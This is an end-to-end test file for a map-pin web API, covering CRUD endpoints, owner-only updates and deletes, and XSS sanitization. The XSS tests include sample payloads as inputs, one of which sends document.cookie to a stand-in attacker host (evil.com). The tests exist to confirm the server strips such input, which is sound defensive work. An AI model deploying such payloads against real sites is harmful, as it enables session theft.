/**
 * End-to-End Tests for Pins
 *
 * Tests for pin (map POI) functionality including:
 * - Creating pins
 * - Reading pins (all, user's, specific)
 * - Updating pins
 * - Deleting pins
 * - Authorization checks
 */

import request from 'supertest';
import { createTestApp, createTestUser, createTestPin } from './helpers/testApp';

let app: any;

beforeAll(async () => {
  app = await createTestApp();
});

describe('Pins', () => {
  let userToken: string;
  let userId: number;
  let otherUserToken: string;
  let otherUserId: number;

  beforeEach(async () => {
    const user = await createTestUser('pinuser@example.com', 'password123', 'Pin User');
    userToken = user.token;
    userId = user.userId;

    const otherUser = await createTestUser('other@example.com', 'password123', 'Other User');
    otherUserToken = otherUser.token;
    otherUserId = otherUser.userId;
  });

  describe('POST /api/pins', () => {
    it('should create a pin with all fields', async () => {
      const pinData = {
        latitude: 37.7749,
        longitude: -122.4194,
        title: 'Golden Gate Park',
        address: 'San Francisco, CA',
        message: 'Beautiful park with lots of trails',
        image: 'https://example.com/ggpark.jpg',
        tags: JSON.stringify(['park', 'nature', 'hiking']),
      };

      const response = await request(app)
        .post('/api/pins')
        .set('Authorization', `Bearer ${userToken}`)
        .send(pinData);

      expect(response.status).toBe(201);
      expect(response.body).toHaveProperty('id');
      expect(typeof response.body.id).toBe('number');
    });

    it('should create a pin with minimal fields', async () => {
      const response = await request(app)
        .post('/api/pins')
        .set('Authorization', `Bearer ${userToken}`)
        .send({
          latitude: 40.7128,
          longitude: -74.006,
        });

      expect(response.status).toBe(201);
      expect(response.body).toHaveProperty('id');
    });

    it('should require authentication', async () => {
      const response = await request(app).post('/api/pins').send({
        latitude: 37.7749,
        longitude: -122.4194,
      });

      expect(response.status).toBe(401);
    });

    it('should store description field and return it on GET', async () => {
      const response = await request(app)
        .post('/api/pins')
        .set('Authorization', `Bearer ${userToken}`)
        .send({
          latitude: 37.7749,
          longitude: -122.4194,
          description: 'A scenic overlook',
        });

      expect(response.status).toBe(201);
      const pinId = response.body.id;

      const getResponse = await request(app)
        .get(`/api/pins/${pinId}`)
        .set('Authorization', `Bearer ${userToken}`);

      expect(getResponse.body[0].description).toBe('A scenic overlook');
    });
  });

  describe('GET /api/pins', () => {
    beforeEach(() => {
      // Create pins for both users
      createTestPin(userId, { title: 'User Pin 1' });
      createTestPin(userId, { title: 'User Pin 2' });
      createTestPin(otherUserId, { title: 'Other User Pin' });
    });

    it('should return all pins', async () => {
      const response = await request(app)
        .get('/api/pins')
        .set('Authorization', `Bearer ${userToken}`);

      expect(response.status).toBe(200);
      expect(Array.isArray(response.body)).toBe(true);
      expect(response.body.length).toBe(3);
    });

    it('should return pins from ALL users, not just the requester', async () => {
      // Any authenticated user can see all pins — this is the documented behavior.
      // The endpoint is a shared public map; auth only ensures you are logged in.
      const response = await request(app)
        .get('/api/pins')
        .set('Authorization', `Bearer ${userToken}`);

      const emails = response.body.map((p: any) => p.email);
      expect(emails).toContain('pinuser@example.com');
      expect(emails).toContain('other@example.com');
    });

    it('should include email in pin data', async () => {
      const response = await request(app)
        .get('/api/pins')
        .set('Authorization', `Bearer ${userToken}`);

      expect(response.body[0]).toHaveProperty('email');
    });

    it('should include tags as a string', async () => {
      const response = await request(app)
        .get('/api/pins')
        .set('Authorization', `Bearer ${userToken}`);

      // Tags are stored as JSON strings
      expect(typeof response.body[0].tags).toBe('string');
    });

    it('should require authentication', async () => {
      const response = await request(app).get('/api/pins');
      expect(response.status).toBe(401);
    });
  });

  describe('GET /api/pins/user', () => {
    beforeEach(() => {
      createTestPin(userId, { title: 'My Pin 1' });
      createTestPin(userId, { title: 'My Pin 2' });
      createTestPin(otherUserId, { title: 'Not My Pin' });
    });

    it('should return only the current user pins', async () => {
      const response = await request(app)
        .get('/api/pins/user')
        .set('Authorization', `Bearer ${userToken}`);

      expect(response.status).toBe(200);
      expect(response.body.length).toBe(2);
      expect(response.body.every((pin: any) => pin.creatorID === userId)).toBe(true);
    });

    it('should return empty array if user has no pins', async () => {
      const newUser = await createTestUser('nopins@example.com', 'password', 'No Pins');

      const response = await request(app)
        .get('/api/pins/user')
        .set('Authorization', `Bearer ${newUser.token}`);

      expect(response.status).toBe(200);
      expect(response.body).toEqual([]);
    });
  });

  describe('GET /api/pins/:id', () => {
    let pinId: number;

    beforeEach(() => {
      pinId = createTestPin(userId, { title: 'Specific Pin' });
    });

    it('should return a specific pin', async () => {
      const response = await request(app)
        .get(`/api/pins/${pinId}`)
        .set('Authorization', `Bearer ${userToken}`);

      expect(response.status).toBe(200);
      expect(response.body[0]).toMatchObject({
        id: pinId,
        title: 'Specific Pin',
      });
    });

    it('should return 404 for non-existent pin', async () => {
      const response = await request(app)
        .get('/api/pins/99999')
        .set('Authorization', `Bearer ${userToken}`);

      expect(response.status).toBe(404);
    });
  });

  describe('PUT /api/pins/:id', () => {
    let pinId: number;

    beforeEach(() => {
      pinId = createTestPin(userId, {
        title: 'Original Title',
        description: 'Original description',
      });
    });

    it('should update pin title', async () => {
      const response = await request(app)
        .put(`/api/pins/${pinId}`)
        .set('Authorization', `Bearer ${userToken}`)
        .send({ title: 'Updated Title' });

      expect(response.status).toBe(200);
      expect(response.body.title).toBe('Updated Title');
    });

    it('should update pin description via description field', async () => {
      const response = await request(app)
        .put(`/api/pins/${pinId}`)
        .set('Authorization', `Bearer ${userToken}`)
        .send({ description: 'Updated description' });

      expect(response.status).toBe(200);
      expect(response.body.description).toBe('Updated description');
    });

    it('should update multiple fields at once', async () => {
      const response = await request(app)
        .put(`/api/pins/${pinId}`)
        .set('Authorization', `Bearer ${userToken}`)
        .send({
          title: 'New Title',
          description: 'New description',
          address: 'New Address',
          image: 'https://example.com/new.jpg',
        });

      expect(response.status).toBe(200);
      expect(response.body).toMatchObject({
        title: 'New Title',
        description: 'New description',
        address: 'New Address',
        image: 'https://example.com/new.jpg',
      });
    });

    it('should return 404 when non-owner tries to update a pin', async () => {
      const response = await request(app)
        .put(`/api/pins/${pinId}`)
        .set('Authorization', `Bearer ${otherUserToken}`)
        .send({ title: 'Hacked Title' });

      // Returns 404 (not 403) so attackers cannot enumerate valid pin IDs
      expect(response.status).toBe(404);
    });

    it('should return 404 for non-existent pin', async () => {
      const response = await request(app)
        .put('/api/pins/99999')
        .set('Authorization', `Bearer ${userToken}`)
        .send({ title: 'Update' });

      expect(response.status).toBe(404);
    });
  });

  describe('DELETE /api/pins/:id', () => {
    let pinId: number;

    beforeEach(() => {
      pinId = createTestPin(userId, { title: 'To Delete' });
    });

    it('should delete own pin', async () => {
      const response = await request(app)
        .delete(`/api/pins/${pinId}`)
        .set('Authorization', `Bearer ${userToken}`);

      expect(response.status).toBe(200);

      // Verify pin is gone
      const getResponse = await request(app)
        .get(`/api/pins/${pinId}`)
        .set('Authorization', `Bearer ${userToken}`);

      expect(getResponse.status).toBe(404);
    });

    it('should return 404 when non-owner tries to delete a pin', async () => {
      const response = await request(app)
        .delete(`/api/pins/${pinId}`)
        .set('Authorization', `Bearer ${otherUserToken}`);

      // Returns 404 (not 403) so attackers cannot enumerate valid pin IDs
      expect(response.status).toBe(404);
    });

    it('should return 404 for both missing and unauthorized pins (no ID enumeration)', async () => {
      // Delete the pin as the owner
      await request(app)
        .delete(`/api/pins/${pinId}`)
        .set('Authorization', `Bearer ${userToken}`);

      // otherUser tries to update the now-deleted pin — should be indistinguishable from
      // a pin that never existed, preventing enumeration of valid IDs via 403 vs 404 diff
      const updateDeleted = await request(app)
        .put(`/api/pins/${pinId}`)
        .set('Authorization', `Bearer ${otherUserToken}`)
        .send({ title: 'Probe' });

      expect(updateDeleted.status).toBe(404);
    });

    it('should return 404 for non-existent pin', async () => {
      const response = await request(app)
        .delete('/api/pins/99999')
        .set('Authorization', `Bearer ${userToken}`);

      expect(response.status).toBe(404);
    });
  });

  describe('Pin Data Integrity', () => {
    it('should preserve coordinates with precision', async () => {
      const latitude = 37.77492839;
      const longitude = -122.41941234;

      const createResponse = await request(app)
        .post('/api/pins')
        .set('Authorization', `Bearer ${userToken}`)
        .send({ latitude, longitude, title: 'Precision Test' });

      const pinId = createResponse.body.id;

      const getResponse = await request(app)
        .get(`/api/pins/${pinId}`)
        .set('Authorization', `Bearer ${userToken}`);

      expect(getResponse.body[0].latitude).toBeCloseTo(latitude, 6);
      expect(getResponse.body[0].longitude).toBeCloseTo(longitude, 6);
    });

    it('should accept extreme valid coordinates', async () => {
      const extremeCoords = [
        { latitude: 90, longitude: 180, title: 'North Pole Edge' },
        { latitude: -90, longitude: -180, title: 'South Pole Edge' },
        { latitude: 0, longitude: 0, title: 'Null Island' },
        { latitude: -89.9, longitude: 179.9, title: 'Near Antarctica' },
      ];

      for (const coords of extremeCoords) {
        const response = await request(app)
          .post('/api/pins')
          .set('Authorization', `Bearer ${userToken}`)
          .send(coords);

        expect(response.status).toBe(201);
        expect(response.body).toHaveProperty('id');
      }
    });

    it('should handle very precise coordinate values', async () => {
      const response = await request(app)
        .post('/api/pins')
        .set('Authorization', `Bearer ${userToken}`)
        .send({
          latitude: 37.12345678901234,
          longitude: -122.98765432109876,
          title: 'High Precision',
        });

      expect(response.status).toBe(201);

      const getResponse = await request(app)
        .get(`/api/pins/${response.body.id}`)
        .set('Authorization', `Bearer ${userToken}`);

      // Should preserve reasonable precision
      expect(getResponse.body[0].latitude).toBeCloseTo(37.12345678901234, 6);
      expect(getResponse.body[0].longitude).toBeCloseTo(-122.98765432109876, 6);
    });

    it('should store and retrieve tags correctly', async () => {
      const tags = ['restaurant', 'italian', 'romantic'];

      const createResponse = await request(app)
        .post('/api/pins')
        .set('Authorization', `Bearer ${userToken}`)
        .send({
          latitude: 37.7749,
          longitude: -122.4194,
          tags,
        });

      const pinId = createResponse.body.id;

      const getResponse = await request(app)
        .get(`/api/pins/${pinId}`)
        .set('Authorization', `Bearer ${userToken}`);

      const storedTags = JSON.parse(getResponse.body[0].tags);
      expect(storedTags).toEqual(tags);
    });

    it('should initialize likes to 0', async () => {
      const response = await request(app)
        .post('/api/pins')
        .set('Authorization', `Bearer ${userToken}`)
        .send({
          latitude: 37.7749,
          longitude: -122.4194,
        });

      const pinId = response.body.id;

      const getResponse = await request(app)
        .get(`/api/pins/${pinId}`)
        .set('Authorization', `Bearer ${userToken}`);

      // Likes should consistently be 0 for new pins
      expect(getResponse.body[0].likes).toBe(0);
    });
  });

  describe('XSS Prevention', () => {
    it('should strip HTML tags from pin text fields on create', async () => {
      const response = await request(app)
        .post('/api/pins')
        .set('Authorization', `Bearer ${userToken}`)
        .send({
          latitude: 37.7749,
          longitude: -122.4194,
          // tag + trailing text — tag stripped, text kept
          title: '<img src=x onerror="alert(1)">Scenic Spot',
          // self-contained tag with no text content — strips to empty
          description: '<img src=x onerror="fetch(\'https://evil.com?c=\'+document.cookie)">',
          address: '<b>123 Main St</b>',
        });

      expect(response.status).toBe(201);
      const pinId = response.body.id;

      const getResponse = await request(app)
        .get(`/api/pins/${pinId}`)
        .set('Authorization', `Bearer ${userToken}`);

      expect(getResponse.status).toBe(200);
      expect(getResponse.body[0].title).toBe('Scenic Spot');
      expect(getResponse.body[0].description).toBe('');
      expect(getResponse.body[0].address).toBe('123 Main St');
    });

    it('should strip HTML tags from pin text fields on update', async () => {
      const createResponse = await request(app)
        .post('/api/pins')
        .set('Authorization', `Bearer ${userToken}`)
        .send({ latitude: 37.7749, longitude: -122.4194, title: 'Clean Title' });

      const pinId = createResponse.body.id;

      const updateResponse = await request(app)
        .put(`/api/pins/${pinId}`)
        .set('Authorization', `Bearer ${userToken}`)
        .send({ title: '<svg onload="alert(1)">Hacked</svg>' });

      expect(updateResponse.status).toBe(200);
      expect(updateResponse.body.title).toBe('Hacked');
    });
  });
});
